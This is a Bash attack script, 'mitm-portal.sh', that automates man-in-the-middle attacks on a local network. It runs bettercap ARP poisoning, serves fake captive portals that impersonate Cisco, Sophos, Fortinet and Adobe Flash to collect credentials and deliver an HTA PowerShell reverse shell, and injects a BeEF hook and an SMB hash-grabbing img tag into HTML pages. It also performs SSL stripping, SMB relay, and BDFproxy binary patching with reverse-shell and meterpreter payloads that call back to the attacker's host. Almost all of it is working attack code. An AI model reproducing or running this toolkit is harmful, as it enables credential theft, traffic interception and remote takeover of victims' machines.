#!/bin/bash
#-Metadata----------------------------------------------------#
#  Filename: mitm-portal.sh              (Update: 2015-08-28) #
#-Info--------------------------------------------------------#
#  MiTM Toolkit utilizing bettercap                           #
#-Author(s)---------------------------------------------------#
#  jbarcia                                                    #
#-Operating System--------------------------------------------#
#  Designed for: Kali Linux 2.0.0 [x64] (VM - VMware)         #
#     Tested on: Kali Linux 2.0.0 [x64/x84/full/light/mini/vm]#
#-Licence-----------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT           #
#-Notes-------------------------------------------------------#
#  Edit the tool locations as needed.                         #
#                             ---                             #
#  installdir=/toolslinux/exploits/mitm-captiveportal         #
#  webdir=/var/www/html                                       #
#  ps1encloc=/toolslinux/exploits/ps1encode                   #
#  beefloc=/usr/bin/beef-xss                                  #
#  msfhandleresource=                                         #
#             /toolslinux/epa/handler/local/handler.rc        #
#  msfsmbcaptresource=                                        #
#             /toolslinux/epa/handler/local/handler_445-SMB.rc#
#  logdir=/root/bettercap                                     #
#  tempdir=/root/temp                                         #
#  apachedir=/etc/apache2                                     #
#  IPTABLES=/sbin/iptables                                    #
#                                                             #
#                             ---                             #
#   **  This script calls on other scripts and custom  **     #
#    **  payloads that may not be readily accessable. **      #
#           ** EDIT this for _YOUR_ payloads! **              #
#-------------------------------------------------------------#


ScriptName="MITM Attack Script Version 4.0"
fdate=`date +%m.%d.%y-%k.%M`
#DEFINED COLOR SETTINGS
RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 6 && tput bold)
#Configure half routing to no by default
half=n
halfdup=

##### Tool Locations
#TOOLS
ps1encloc=/toolslinux/exploits/ps1encode/ps1encodeV2.rb
beefloc=/usr/bin/beef-xss
relayxloc=/usr/local/bin/smbrelayx.py
msfhandleresource=/toolslinux/epa/handler/local/handler.rc
msfsmbcaptresource=/toolslinux/epa/handler/local/handler_445-SMB.rc
IPTABLES=/sbin/iptables
pcredzloc=/toolslinux/recon/net-creds/net-creds.py

#DIRS
installdir=/toolslinux/exploits/mitm-captiveportal
webdir=/var/www/html
logdir=/root/bettercap
tempdir=/root/temp
apachedir=/etc/apache2

#CONFIGS
BDFconfig=/etc/bdfproxy/bdfproxy.cfg

#PORTS
sslstriport=8443

mkdir -p $tempdir
mkdir -p $logdir
mkdir -p $tempdir/sites-enabled.bk

InstallDeps()
{
##### Installing dependencies
if ! dpkg -s conntrack > /dev/null; then
   echo -e "Installing Dependencies"
    apt-get update
   sudo apt-get -y --force-yes remove python-pypcap
   sudo apt-get -y --force-yes install conntrack python-libpcap
      if ! dpkg -s conntrack > /dev/null; then
        echo -e "Install Failed - Check Internet Connection!"
	exit 0
      fi
fi
if [ ! -d "/opt/bettercap-git/" ]; then
    apt-get update
   apt-get -y -qq install git ruby-dev libpcap-dev
   git clone -q https://github.com/evilsocket/bettercap.git /opt/bettercap-git/
   pushd /opt/bettercap-git/ >/dev/null
   git pull -q
   gem build bettercap.gemspec
   gem install bettercap*.gem
   popd >/dev/null
      if [ ! -d "/opt/bettercap-git/" ]; then
         echo -e "Install Failed - Issue when git cloning"
         exit 0
      fi
fi
if ! dpkg -s bdfproxy > /dev/null; then
    apt-get update
   sudo apt-get -y --force-yes install bdfproxy
      if ! dpkg -s bdfproxy > /dev/null; then
        echo -e "Install Failed - Check Internet Connection!"
  exit 0
      fi
fi
if ! dpkg -s beef-xss > /dev/null; then
    apt-get update
   sudo apt-get -y --force-yes install beef-xss
      if ! dpkg -s beef-xss > /dev/null; then
        echo -e "Install Failed - Check Internet Connection!"
  exit 0
      fi
fi


}

CreateFiles()
{
##### Verify /var/lib/users Exists
#if [ ! -e "/var/lib/users" ]; then
   echo -e "User ID \t | Password \t | IP Address \t | MAC \t | Date" >/var/lib/users
#fi
chown www-data /var/lib/users

##### Verify /usr/bin/rmtrack Exists
if [ ! -e "/usr/bin/rmtrack" ]; then
echo -e "/usr/sbin/conntrack -L \\" > /usr/bin/rmtrack
echo -e "    |grep \$1 \\" >> /usr/bin/rmtrack
echo -e "    |grep ESTAB \\" >> /usr/bin/rmtrack
echo -e "    |grep 'dport=80' \\" >> /usr/bin/rmtrack
echo -e "    |awk \\" >> /usr/bin/rmtrack
echo -e "        \"{ system(\\\"conntrack -D --orig-src \$1 --orig-dst \\\" \\" >> /usr/bin/rmtrack
echo -e "            substr(\\\$6,5) \\\" -p tcp --orig-port-src \\\" substr(\\\$7,7) \\\" \\" >> /usr/bin/rmtrack
echo -e "            --orig-port-dst 80\\\"); }\"" >> /usr/bin/rmtrack
fi
chmod +x /usr/bin/rmtrack

##### Verify /etc/sudoers.d/mitm-captive Exists
if [ ! -e "/etc/sudoers.d/mitm-captive" ]; then
echo -e "www-data ALL = NOPASSWD: /sbin/iptables -I internet 1 -t nat -m mac --mac-source ??\:??\:??\:??\:??\:?? -j RETURN" > /etc/sudoers.d/mitm-captive
echo -e "www-data ALL = NOPASSWD: /sbin/iptables -D internet -t nat -m mac --mac-source ??\:??\:??\:??\:??\:?? -j RETURN" >> /etc/sudoers.d/mitm-captive
echo -e "www-data ALL = NOPASSWD: /usr/bin/rmtrack [0-9]*.[0-9]*.[0-9]*.[0-9]*" >> /etc/sudoers.d/mitm-captive
fi
}

CreateFirewallRules()
{
clear
echo
echo $BLUE"$ScriptName"
echo
echo $RED"************************************************";
echo $RED"Enter the Attacker Interface. Example eth0:"$GREEN;
read -e INTERFACE
ATTACKER=$(/sbin/ifconfig $INTERFACE | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}')
echo
echo $RED"Attacker IP:"
echo $GREEN"$ATTACKER"
echo 
#xterm -bg blue -fg white -geometry 100x30+1000 -T "Network Config" -e "route -n && echo && ifconfig $INTERFACE && sleep 7m"&
#if [ $attacktype  -eq 1 ] || [ $attacktype -eq 2 ]; then
#    echo $RED"Enter the Gateway IP address. Example 192.168.1.1:";
#    read -e GATEWAY
#    echo $RED"Enter the Attacker IP address. Example 192.168.1.100:";
#    read -e ATTACKER
#fi
xterm -bg blue -fg white -geometry 100x50+1000 -T "Passive ARP Discovery" -e "netdiscover -i $INTERFACE -p"&
echo $RED"Enter the Number of Victims to Poison:";
read -e VICTIMCOUNT

#echo $RED"************************************************";
#echo ""


#clear
#echo
#echo $BLUE"$ScriptName"
echo
echo $RED"************************************************";
echo $RED"Enter the Victim IP addresses, seperated by <ENTER>."; 
echo $RED"Example 192.168.1.2:"$GREEN;

VICTIM=()
VICTIMS=()
   for ((i=1; i<=VICTIMCOUNT; i++));
   do
      read -e VICTIMTEMP
      $IPTABLES -A FORWARD -s $VICTIMTEMP -p udp -m udp --dport 53 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
      VICTIM+=( $VICTIMTEMP )
      if [ $i -gt 1 ]; then
         VICTIMS+=$( echo "," && echo $VICTIMTEMP)
      fi
   done
   #Remove Spaces
   VICTIMSTEMP=`echo ${VICTIMS[*]} | sed 's/ //g'`
   VICTIMSALL=`echo ${VICTIMS[*]} | sed 's/ //g'`
   #Remove first two chars
   #VICTIMSALL=`echo $VICTIMSTEMP| awk '{print substr($0,3)}'`
   #Appends Victim1,Victim2,Victim3,...
   #BETTERCAP Format

if [ $VICTIMCOUNT -gt 1 ]; then
   TARGETS=${VICTIM[0]}${VICTIMSALL[*]}
else
   TARGETS=$VICTIMTEMP
fi

#####DEBUG
#echo "VICTIM=${VICTIM[@]}"
#echo $VICTIMS
#echo $VICTIMSTEMP
#echo $VICTIMSALL
#echo "TARGETS=$TARGETS"
#read -p ""

##### FIREWALL SCRIPT
# /usr/local/sbin/iptables
# Create internet chain and add allow rules
# This is used to authenticate users who have already signed up
#$IPTABLES -A FORWARD -s $VICTIM -p udp -m udp --dport 53 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
$IPTABLES -A INPUT -p udp -m udp --sport 53 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
$IPTABLES -N internet -t nat
# First send all traffic via newly created internet chain
# At the prerouting NAT stage this will DNAT them to the local
# webserver for them to signup if they aren't authorized
# Packets for unauthorized users are marked for dropping later
$IPTABLES -t nat -A PREROUTING -j internet
###### INTERNET CHAIN ##########
# Allow authorized clients in, redirect all others to login webserver
# Add known users to the NAT table to stop their dest being rewritten
# Ignore MAC address with a * - these users are blocked
# This awk script goes through the /var/lib/users flat file line by line
#awk 'BEGIN { FS="t"; } { system("$IPTABLES -t nat -A internet -m mac --mac-source "$4" -j RETURN"); }' /var/lib/users
# MAC address not found. Mark the packet 99
$IPTABLES -t nat -A internet -j MARK --set-mark 99
# Redirects web requests from Unauthorized users to logon Web Page
$IPTABLES -t nat -A internet -m mark --mark 99 -p tcp --dport 80 -j DNAT --to-destination $ATTACKER
################################
# Now that we've got to the forward filter, drop all packets
# marked 99 - these are unknown users. We can't drop them earlier
# as there's no filter table
$IPTABLES -t filter -A FORWARD -m mark --mark 99 -j DROP
#echo
#echo "Firewall Config"
#echo "----------------------------------------------"
#iptables -L
#echo
#echo $GREEN"Press <ENTER> To Continue"
#read -p ""
}

Begin()
{
mkdir -p $tempdir/www
mv /var/www/* $tempdir/www/
clear
echo
echo $BLUE"$ScriptName"
echo
echo $RED"*************************************************************************";
echo $RED"*    1.  Captive Portal - Log In Creds / Reverse Shell                  *";
echo $RED"*    2.  Captive Portal - Log In Creds / Reverse Shell with DNS Spoof   *";
echo $RED"*    3.  SMB - Hash Grab                                                *";
echo $RED"*    4.  SMB - Hash Relay                                               *";
echo $RED"*    5.  Web - Beef Hook                                                *";
echo $RED"*    6.  Web - SSL Strip and Capture Traffic                            *";
echo $RED"*    7.  Web - BDFproxy/BDFfactory                                      *";
echo $RED"*    8.  Web - Hamster/Ferret                                           *";
echo $RED"*************************************************************************";
echo ""

echo $BLUE"Select Menu Option:"$GREEN
read attacktype
if [ $attacktype -eq 1 ] || [ $attacktype -eq 2 ]; then
HTARS
else
if [ $attacktype -eq 3 ] || [ $attacktype -eq 4 ]; then
SMBhash
else
if [ $attacktype -eq 5 ]; then
BeefHook
else
if [ $attacktype -eq 6 ]; then
FOO
else
if [ $attacktype -eq 7 ]; then
BDF
else
if [ $attacktype -eq 8 ]; then
FOO
else
Begin
fi
fi
fi
fi
fi
fi
}

HTARS()
{
CreateFirewallRules
clear
port=80,443
echo
echo $BLUE"$ScriptName"
echo $BLUE"Captive Portal - HTA Reverse Shell"
echo
echo $RED"************************************************";
echo $RED"*    1.  Cisco                                 *";
echo $RED"*    2.  Microsoft Forefront                   *"; 
echo $RED"*    3.  Sophos                                *";
echo $RED"*    4.  SQUID                                 *";
echo $RED"*    5.  TrendMicro                            *";
echo $RED"*    6.  Fortigate\\Fortinet                    *";
echo $RED"*    7.  Flash Updater                         *";
echo $RED"*    8.  Forttinet - Old Style                 *";
echo $RED"*    9.  Custom                                *";
echo $RED"************************************************";
echo ""

echo $BLUE"Select Menu Option:"$GREEN
read menuoption

mv $apachedir/sites-enabled/* $tempdir/sites-enabled.bk/

apachesite=$apachedir/sites-enabled/000-default
cat <<EOF > "${apachesite}"
<VirtualHost *:80>
  # The ServerName directive sets the request scheme, hostname and port that
  # the server uses to identify itself. This is used when creating
  # redirection URLs. In the context of virtual hosts, the ServerName
  # specifies what hostname must appear in the request's Host: header to
  # match this virtual host. For the default virtual host (this file) this
  # value is not decisive as it is used as a last resort host regardless.
  # However, you must set it for any further virtual host explicitly.
  #ServerName www.example.com

  ServerAdmin webmaster@localhost
  DocumentRoot $webdir

  # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
  # error, crit, alert, emerg.
  # It is also possible to configure the loglevel for particular
  # modules, e.g.
  #LogLevel info ssl:warn

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

  # For most configuration files from conf-available/, which are
  # enabled or disabled at a global level, it is possible to
  # include a line for only one particular virtual host. For example the
  # following line enables the CGI configuration for this host only
  # after it has been globally disabled with "a2disconf".
  #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

EOF


service apache2 start
echo ""
echo ""
echo $GREEN"Creating Malicious Code and Importing Website"
mkdir -p $webdir
ruby $ps1encloc -i $ATTACKER > $webdir/exploit.hta

if [ $menuoption -eq 1 ]; then
tar -xf $installdir/ploys/HTA/cisco.tar -C $webdir
sed -i "s/powershell/$(cat $webdir/exploit.hta)/g" $webdir/verify.hta
else
if [ $menuoption -eq 2 ]; then
tar -xf $installdir/ploys/HTA/MSForefront.tar -C $webdir
sed -i "s/powershell/$(cat $webdir/exploit.hta)/g" $webdir/verify.hta
else
if [ $menuoption -eq 3 ]; then
tar -xf $installdir/ploys/HTA/Sophos.tar -C $webdir
sed -i "s/powershell/$(cat $webdir/exploit.hta)/g" $webdir/verify.hta
else
if [ $menuoption -eq 4 ]; then
tar -xf $installdir/ploys/HTA/squid.tar -C $webdir
sed -i "s/powershell/$(cat $webdir/exploit.hta)/g" $webdir/verify.hta
else
if [ $menuoption -eq 5 ]; then
tar -xf $installdir/ploys/HTA/trendmicro.tar -C $webdir
sed -i "s/powershell/$(cat $webdir/exploit.hta)/g" $webdir/verify.hta
else
if [ $menuoption -eq 6 ]; then
tar -xf $installdir/ploys/HTA/Fortinet.tar -C $webdir
sed -i "s/powershell/$(cat $webdir/exploit.hta)/g" $webdir/verify.hta
else
if [ $menuoption -eq 7 ]; then
tar -xf $installdir/ploys/HTA/flash.tar -C $webdir
#sed -n "/<script/,/<\/script>/p" $webdir/exploit.hta > $webdir/reverse_code.hta
sed -i "s/powershell/$(cat $webdir/exploit.hta)/g" $webdir/install_flash_player.hta
else
if [ $menuoption -eq 8 ]; then
tar -xf $installdir/ploys/HTA/Fortinet-Old-Style.tar -C $webdir
sed -i "s/powershell/$(cat $webdir/exploit.hta)/g" $webdir/verify.hta
else
if [ $menuoption -eq 9 ]; then
echo "Move the web files over to $webdir/ then press <ENTER>"
read -p ""
sed -i "s/powershell/$(cat $webdir/exploit.hta)/g" $webdir/verify.hta
else
HTARS
fi
fi
fi
fi
fi
fi
fi
fi
fi
ConfigWeb

}


ConfigWeb()
{
clear
if [ $menuoption -eq 7 ]; then
SERVERNAME=get
DOMAINNAME=adobe.com
SITENAME=Flash 
else
echo
echo $BLUE"$ScriptName"
echo $BLUE"Captive Portal - HTA Reverse Shell"
echo
echo $RED"************************************************";
echo $RED"Enter the Desired Server Name, Example: PROXY"$GREEN;
read -e SERVERNAME
echo $RED"Enter the Domain Name, Example: DOMAIN.COM"$GREEN;
read -e DOMAINNAME
echo $RED"Enter the Site Name, Example: Company Web Access Portal"$GREEN;
read -e SITENAME
echo $RED"************************************************";
echo ""

sed -i s/SERVER_NAME_REPLACE/$SERVERNAME/ $webdir/index.php
sed -i s/DOMAIN_NAME_REPLACE/$DOMAINNAME/ $webdir/index.php
sed -i s/SITE_NAME_REPLACE/"$SITENAME"/ $webdir/index.php
fi
if [ $attacktype -eq 2 ]; then
  ConfigDNS
fi
}

ConfigDNS()
{
echo 1 > /proc/sys/net/ipv4/ip_forward

sed -i 's/^\/\/DNSSPOOF//' $webdir/index.php

echo "$ATTACKER $SERVERNAME.$DOMAINNAME" > $webdir/hosts.txt
}


SMBhash()
{
#echo SMBhash
CreateFirewallRules
RevertFirewall
port=80,443

#####Create Bettercap Filter
smbbetter=$installdir/smb.rb
cat <<EOF > "${smbbetter}"
=begin
BETTERCAP
Author : Joseph Barcia
Email  : jbarcia.resume@gmail.com
GitHub : https://github.com/jbarcia/
This project is released under the GPL 3 license.
=end

# Handle BeEF framework execution and injection into
# html pages automagically.
class SMBgrab < Proxy::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      Logger.info "Hacking http://#{request.host}#{request.url} "
      # make sure to use sub! or gsub! to update the instance
      response.body.sub!( '</body', '<img src="\\\\\\\\\\\\\\\\$ATTACKER\share\file.jpg"></body' )
    end
  end
end

EOF

if [ $attacktype -eq 4 ]; then
    # Create IF statement if /toolslinux/exploits/impacket/impacket !exist cd /toolslinux/exploits/impacket/ && python setup.py install
    # Create IF statement if /toolslinux/exploits/impacket/impacket/smbrelayx !exist cp -R /usr/share/doc/python-impacket-doc/examples/smbrelayx /toolslinux/exploits/impacket/impacket/
       
    clear
    echo
    echo $BLUE"$ScriptName"
    echo $BLUE"BETTERCAP SMB Relay"
    echo
    echo $RED"************************************************";
    echo $RED"Enter the IP address to relay to:"; 
    echo $RED"Example 192.168.1.2:"$GREEN;
    read -e RELAYIP
    echo $RED"************************************************";
    echo ""
    cd $tempdir
    ruby $ps1encloc -i $ATTACKER -t exe
fi

}

BeefHook()
{
#echo BeefHook
CreateFirewallRules
RevertFirewall
PORT=80,443

#####Create Bettercap Filter
beefbetter=$installdir/beef.rb
cat <<EOF > "${beefbetter}"
=begin
BETTERCAP
Author : Joseph Barcia
Email  : jbarcia.resume@gmail.com
GitHub : https://github.com/jbarcia/
This project is released under the GPL 3 license.
=end

# Handle BeEF framework execution and injection into
# html pages automagically.
class BeefBox < Proxy::Module
  def initialize
    @beefport = 3000
    @beefpid  = nil
    @hookname = 'hook.js'    
    @jsfile   = "http://#{Context.get.ifconfig[:ip_saddr]}:#{@beefport}/#{@hookname}"

    Logger.warn "[BEEFBOX] Starting BeEF ..."

  end

  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      Logger.warn "Injecting BeEF into http://#{request.host}#{request.url}"

      response.body.sub!( '</title>', "</title><script src='#{@jsfile}' type='text/javascript'></script>" )
    end
  end

end

EOF

}


BDF()
{
  #echo BDF
  CreateFirewallRules
  RevertFirewall
  cp $BDFconfig $BDFconfig.orig
  sed '/targets/,$d' $BDFconfig > $BDFconfig.tmp
  mv $BDFconfig.tmp $BDFconfig

cat <<EOF >> "${BDFconfig}"
[targets]
  #MAKE SURE that your settings for host and port DO NOT
  # overlap between different types of payloads
  
  [[ALL]] # DEFAULT settings for all targets REQUIRED
  
  LinuxType = ALL   # choices: x86/x64/ALL/None
  WindowsType = ALL   # choices: x86/x64/ALL/None
  FatPriority = x64   # choices: x86 or x64
  
  FileSizeMax = 60000000  # ~60 MB (just under) No patching of files this large

  CompressedFiles = True #True/False
    [[[LinuxIntelx86]]]
    SHELL = reverse_shell_tcp   # This is the BDF syntax
    HOST = $ATTACKER    # The C2
    PORT = 8888
    SUPPLIED_SHELLCODE = None
    MSFPAYLOAD = linux/x86/shell_reverse_tcp  # MSF syntax
    
    [[[LinuxIntelx64]]]
    SHELL = reverse_shell_tcp
    HOST = $ATTACKER
    PORT = 9999
    SUPPLIED_SHELLCODE = None
    MSFPAYLOAD = linux/x64/shell_reverse_tcp

    [[[WindowsIntelx86]]]
    PATCH_TYPE = SINGLE #JUMP/SINGLE/APPEND
    # PATCH_METHOD overwrites PATCH_TYPE with jump
    PATCH_METHOD = automatic
    HOST = $ATTACKER
    PORT = 8843
    SHELL = iat_reverse_tcp_stager_threaded
    SUPPLIED_SHELLCODE = None
    ZERO_CERT = False
    PATCH_DLL = True
    MSFPAYLOAD = windows/meterpreter/reverse_tcp

    [[[WindowsIntelx64]]]
    PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
    # PATCH_METHOD overwrites PATCH_TYPE with jump
    PATCH_METHOD = automatic
    HOST = $ATTACKER
    PORT = 8088
    SHELL = iat_reverse_tcp_stager_threaded
    SUPPLIED_SHELLCODE = None
    ZERO_CERT = True
    PATCH_DLL = False
    MSFPAYLOAD = windows/x64/shell_reverse_tcp

    [[[MachoIntelx86]]]
    SHELL = reverse_shell_tcp
    HOST = $ATTACKER
    PORT = 4444
    SUPPLIED_SHELLCODE = None
    MSFPAYLOAD = linux/x64/shell_reverse_tcp

    [[[MachoIntelx64]]]
    SHELL = reverse_shell_tcp
    HOST = $ATTACKER
    PORT = 5555
    SUPPLIED_SHELLCODE = None
    MSFPAYLOAD = linux/x64/shell_reverse_tcp

EOF

}

FOO()
{
CreateFirewallRules
RevertFirewall
}

Attack()
{
echo 1 > /proc/sys/net/ipv4/ip_forward

if [ $attacktype -ne 6 ]; then
  echo $RED"************************************************";
  echo $RED"Would you like to perform SSLstrip Attack?(y/n)";
  echo $RED"Captive portal will not work"$GREEN;
  read -e sslstripa
fi
if [ "$sslstripa" == "y" -o "$sslstripa" == "Y" ] || [ $attacktype -eq 6 ]; then
    ##### SSLStrip Attack
    ##### SSLStrip Firewall Rule
    $IPTABLES -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8443
    xterm -bg blue -fg white -geometry 100x50+300+500 -T "SSL Strip" -e "sslstrip -f -a -k -l $sslstriport -w $logdir/$fdate.sslstrip.log"&
fi


echo $RED"************************************************";
echo $RED"Would you like to perform half routing?(y/n)";
echo $RED"USE WITH CAUTION - DEFAULT IS NO"$GREEN;
read -e half
if [ "$half" == "y" -o "$half" == "Y" ]; then
  halfdup=--half-duplex
  echo $RED"FORWARDING WILL NOT WORK, INTERNET ACCESS WILL BE INTERMITENT!"
fi
#echo $halfdup

#TCPdump
tcpdump -w $logdir/$fdate.pcap

if [ $attacktype -eq 1 ] || [ $attacktype -eq 2 ]; then
  ##### Captive Portal #####

    xterm -bg blue -fg white -geometry 100x500+1000 -T "Metasploit Handler" -e "msfconsole -r $msfhandleresource"&
    echo
    echo $GREEN"Press <ENTER> After Meterpreter Loads"
    read -p ""
    #####Java ploy - no creds
    if [ $menuoption -ne 7 ]; then
        xterm -bg blue -fg white -geometry 100x20+1000 -T "User Creds File - /var/lib/users" -e "tail -f /var/lib/users"&
    fi

    #####dnsspoof DNS Spoof
    if [ $attacktype -eq 2 ]; then
      xterm -bg blue -fg white -geometry 100x50+300+500 -T "DNS Spoof for $SERVERNAME.$DOMAINNAME" -e "dnsspoof -i $INTERFACE -f $webdir/hosts.txt"&
    fi

  echo $INTERFACE $TARGETS
  xterm -bg blue -fg white -geometry 100x70+0 -T "BETTERCAP ARP Poison" -e "bettercap -X -I $INTERFACE -T $TARGETS --log $logdir/$fdate.bettercap.log $halfdup"
  echo ""
fi

if [ $attacktype -eq 3 ] || [ $attacktype -eq 4 ]; then
  service apache2 stop
  if [ $attacktype -eq 3 ]; then
  ##### SMB Hash #####
    xterm -bg blue -fg white -geometry 100x500+1000 -T "Metasploit Handler" -e "msfconsole -r $msfsmbcaptresource"&
    echo
    echo $GREEN"Press <ENTER> After Meterpreter Loads"
    read -p ""
  fi
    
if [ $attacktype -eq 4 ]; then
  ##### SMB Relay #####
    xterm -bg blue -fg white -geometry 100x20+1000 -T "PCredz to Capture Hashes" -e "python $pcredzloc -i $INTERFACE"&
    xterm -bg blue -fg white -geometry 100x50+1000 -T "SMB Relay" -e "python $relayxloc -h $RELAYIP -e $tempdir/final_.exe"&
fi
    echo $INTERFACE $TARGETS
    xterm -bg blue -fg white -geometry 100x70+0 -T "BETTERCAP ARP Poison" -e "bettercap -X -I $INTERFACE --proxy-module $smbbetter -T $TARGETS --log $logdir/$fdate.bettercap.log $halfdup"
    echo ""
fi



if [ $attacktype -eq 5 ]; then
  ##### Beef Hook #####
    $beefloc
    echo $INTERFACE $TARGETS
    xterm -bg blue -fg white -geometry 100x70+0 -T "BETTERCAP ARP Poison" -e "bettercap -X -I $INTERFACE --proxy-module $beefbetter -T $TARGETS --log $logdir/$fdate.bettercap.log $halfdup"
    echo ""
fi

if [ $attacktype -eq 6 ] || [ $attacktype -eq 7 ] || [ $attacktype -eq 8 ]; then
  ##### Web/SSL Strip #####
    xterm -bg blue -fg white -geometry 100x20+1000 -T "PCredz to Capture Hashes" -e "python $pcredzloc -i $INTERFACE"&
    if [ $attacktype -eq 7 ]; then
      xterm -bg blue -fg white -geometry 100x50+300+500 -T "BDFproxy" -e "bdfproxy"&
      xterm -bg blue -fg white -geometry 100x500+1000 -T "Metasploit Handler" -e "msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc"&
    fi
    if [ $attacktype -eq 8 ]; then
      xterm -bg blue -fg white -geometry 100x500+1000 -T "Hamster" -e "hamster"&
      xterm -bg blue -fg white -geometry 100x50+300+500 -T "Ferret" -e "iceweasel http://127.0.0.1:1234"&
    fi
    echo $INTERFACE $TARGETS
    xterm -bg blue -fg white -geometry 100x70+0 -T "BETTERCAP ARP Poison" -e "bettercap -X -I $INTERFACE -T $TARGETS --log $logdir/$fdate.bettercap.log $halfdup"
    echo ""
fi
}




RevertFirewall()
{
echo ----------------------------------------------
echo "Stopping firewall and allowing everyone..."
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
clear
}




#####Begining
service apache2 stop
cd $tempdir
COUNT=1
InstallDeps
CreateFiles
RevertFirewall
#NetworkConfig
Begin
#CreateFirewallRules
#ConfigWeb
#ConfigDNS
Attack


service apache2 stop

rm $apachedir/sites-enabled/000-default
rm -r $webdir/*
mv $tempdir/www/* /var/www/
mv $tempdir/sites-enabled.bk/* $apachedir/sites-enabled/
rm $installdir/smb.rb

clear
echo 
echo $BLUE"$ScriptName"
echo 
echo $RED"************************************************";
echo $RED"Do You Want to Revert Your Firewall Back to Allow All? (y/n)"$GREEN;
read -e REVERT
if [ "$REVERT" == "y" -o "$REPLY" == "Y" ]; then
   RevertFirewall
fi
echo 0 > /proc/sys/net/ipv4/ip_forward

echo "All Logs and Credentials are Stored: $logdir"
if [ $attacktype  -eq 1 ] || [ $attacktype -eq 2 ]; then
	mv /var/lib/users $logdir/$fdate.captured-credentials.txt
fi
if [ $attacktype -eq 3 ]; then
	mv /toolslinux/epa/logs/msf_meterpreter/* $logdir/
fi
